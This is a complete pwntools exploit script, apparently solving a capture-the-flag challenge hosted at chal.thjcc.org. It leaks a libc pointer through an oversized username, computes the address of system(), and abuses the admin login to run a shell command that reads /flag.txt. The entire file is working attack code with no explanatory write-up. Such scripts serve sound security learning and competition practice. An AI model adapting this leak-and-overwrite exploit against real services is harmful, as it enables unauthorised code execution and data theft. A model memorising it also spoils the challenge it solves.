from pwn import *

context.log_level = "info"

HOST = "chal.thjcc.org"
PORT = 10003

LEAK_OFFSET = 240
POINTER_SIZE = 8
SYSTEM_FROM_LEAK_DELTA = 0x1BF680


def poison_stack_with_invalid_option(p):
    p.recvuntil(b"> ")
    p.sendline(b"3")
    p.recvuntil(b"Invalid option!\n")


def leak_libc_pointer(p):
    p.recvuntil(b"> ")
    p.sendline(b"1")

    p.recvuntil(b"username: ")
    p.send(b"A" * LEAK_OFFSET)

    p.recvuntil(b"password: ")
    p.send(b"B" * POINTER_SIZE)

    resp = p.recvuntil(b" login failed!")
    data = resp[:-len(b" login failed!")]

    leak = data[LEAK_OFFSET : LEAK_OFFSET + 6]
    if len(leak) < 6:
        raise ValueError("Leak too short; retry.")

    return u64(leak.ljust(8, b"\x00"))


def login_as_admin(p, system_addr):
    p.recvuntil(b"> ")
    p.sendline(b"1")

    p.recvuntil(b"username: ")
    p.send(b"admin\x00")

    p.recvuntil(b"password: ")
    p.send(p64(system_addr))


def main():
    p = remote(HOST, PORT)
    poison_stack_with_invalid_option(p)
    leak = leak_libc_pointer(p)
    system_addr = leak - SYSTEM_FROM_LEAK_DELTA

    log.success(f"Leaked libc pointer: {hex(leak)}")
    log.success(f"Computed system address: {hex(system_addr)}")

    login_as_admin(p, system_addr)
    p.recvuntil(b"I should change my password...")
    p.sendline(b"cat /flag.txt; exit")
    print(p.recvall(timeout=2).decode(errors="ignore"))


if __name__ == "__main__":
    main()
